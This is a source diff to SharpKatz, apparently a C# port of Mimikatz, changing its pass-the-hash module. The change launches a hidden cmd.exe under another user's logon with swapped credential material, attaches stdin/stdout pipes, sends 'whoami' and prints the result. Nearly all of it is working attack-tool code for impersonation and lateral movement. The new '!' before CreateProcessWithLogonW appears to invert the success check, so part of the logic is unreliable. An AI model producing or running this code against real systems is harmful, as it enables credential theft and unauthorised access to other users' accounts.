@@ -4,10 +4,13 @@
 // License: BSD 3-Clause
 //
 
+using Microsoft.Win32.SafeHandles;
 using SharpKatz.Credential;
 using System;
 using System.Collections.Generic;
+using System.IO;
 using System.Runtime.InteropServices;
+using System.Text;
 using static SharpKatz.Module.SharpKerberos;
 using static SharpKatz.Win32.Natives;
 
@@ -115,8 +118,31 @@ namespace SharpKatz.Module
                 }
                 else if (!string.IsNullOrEmpty(user))
                 {
+                    //pipe for stdin and stdout
+                    var saHandles = new SECURITY_ATTRIBUTES();
+                    saHandles.nLength = Marshal.SizeOf(saHandles);
+                    saHandles.bInheritHandle = true;
+                    saHandles.lpSecurityDescriptor = IntPtr.Zero;
+                    IntPtr hStdOutRead;
+                    IntPtr hStdOutWrite;
+                    IntPtr hStdInRead;
+                    IntPtr hStdInWrite;
+                    // StdOut pipe
+                    CreatePipe(out hStdOutRead, out hStdOutWrite, ref saHandles, 999999);
+                    SetHandleInformation(hStdOutRead, HANDLE_FLAGS.INHERIT, 0);
+                    // StdIn pipe
+                    CreatePipe(out hStdInRead, out hStdInWrite, ref saHandles, 999999);
+                    SetHandleInformation(hStdInWrite, HANDLE_FLAGS.INHERIT, 0);
+                    //
                     PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
-                    if (CreateProcessWithLogonW(user, "", domain, @"C:\Windows\System32\", binary, arguments, CreationFlags.CREATE_SUSPENDED, ref pi))
+                    STARTUPINFOEX si = new STARTUPINFOEX();
+                    si.StartupInfo.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFOEX));
+                    si.StartupInfo.hStdInput = hStdInRead;
+                    si.StartupInfo.hStdErr = hStdOutWrite;
+                    si.StartupInfo.hStdOutput = hStdOutWrite;
+                    si.StartupInfo.dwFlags = 0x00000001 | 0x00000100;
+                    si.StartupInfo.wShowWindow = 0x0000;
+                    if (!Win32.Natives.CreateProcessWithLogonW(user, "", domain, LogonFlags.NetCredentialsOnly, @"C:\Windows\System32\cmd.exe", @"C:\Windows\System32\cmd.exe", CreationFlags.CREATE_SUSPENDED, 0, @"C:\Windows\System32\", ref si, out pi))
                     {
                         procid = pi.dwProcessId;
                         IntPtr hToken = IntPtr.Zero;
@@ -138,6 +164,8 @@ namespace SharpKatz.Module
                                 if (data.isReplaceOk)
                                 {
                                     NtResumeProcess(pi.hProcess);
+                                    WriteToPipe(hStdInWrite, "/c whoami");
+                                    Console.WriteLine(ReadFromPipe(pi.hProcess, hStdOutRead, Encoding.GetEncoding(GetConsoleOutputCP())));
                                     return procid;
                                 }
                                 else
@@ -189,17 +217,83 @@ namespace SharpKatz.Module
             }
         }
 
-        public static bool CreateProcessWithLogonW(string username, string password, string domain, string path, string binary, string arguments, CreationFlags cf, ref PROCESS_INFORMATION processInformation)
+        public static bool WriteToPipe(IntPtr hStdInWrite, string command)
         {
-            STARTUPINFO startupInfo = new STARTUPINFO();
-            startupInfo.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));
-            processInformation = new PROCESS_INFORMATION();
-            if (!Win32.Natives.CreateProcessWithLogonW(username, domain, password,
-                LogonFlags.NetCredentialsOnly, path + binary, path + binary + " " + arguments, cf, 0, path, ref startupInfo, out processInformation))
+            uint outbytes;
+            byte[] cb = Encoding.ASCII.GetBytes(command + "\n\r");
+            if (!WriteFile(hStdInWrite, cb, (uint)cb.Length, out outbytes, IntPtr.Zero))
             {
+                Console.WriteLine("  [!] WriteFile failed to execute!: {0}", Marshal.GetLastWin32Error());
                 return false;
             }
             return true;
         }
+
+        public static string ReadFromPipe(IntPtr hProcess, IntPtr hStdOutRead, Encoding encoding)
+        {
+            SafeFileHandle safeHandle = new SafeFileHandle(hStdOutRead, false);
+            var reader = new StreamReader(new FileStream(safeHandle, FileAccess.Read, 4096, false), encoding, true);
+            string result = "";
+            bool exit = false;
+            try
+            {
+                do
+                {
+                    if (WaitForSingleObject(hProcess, 100) == 0)
+                    {
+                        exit = true;
+                    }
+
+                    char[] buf = null;
+                    int bytesRead;
+
+                    uint bytesToRead = 0;
+
+                    bool peekRet = PeekNamedPipe(hStdOutRead, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref bytesToRead, IntPtr.Zero);
+
+                    if (peekRet == true && bytesToRead == 0)
+                    {
+                        if (exit == true)
+                        {
+                            break;
+                        }
+                        else
+                        {
+                            continue;
+                        }
+                    }
+
+                    if (bytesToRead > 4096)
+                        bytesToRead = 4096;
+
+                    buf = new char[bytesToRead];
+                    bytesRead = reader.Read(buf, 0, buf.Length);
+                    if (bytesRead > 0)
+                    {
+                        result += new string(buf);
+                    }
+
+                } while (true);
+                reader.Close();
+            }
+            finally
+            {
+                if (!safeHandle.IsClosed)
+                {
+                    safeHandle.Close();
+                }
+            }
+            return result;
+        }
+
+        //public static bool CreateProcessWithLogonW(string username, string password, string domain, string path, string binary, string arguments, CreationFlags cf, ref PROCESS_INFORMATION processInformation)
+        //{
+        //    
+        //    if (!)
+        //    {
+        //        return false;
+        //    }
+        //    return true;
+        //}
     }
 }
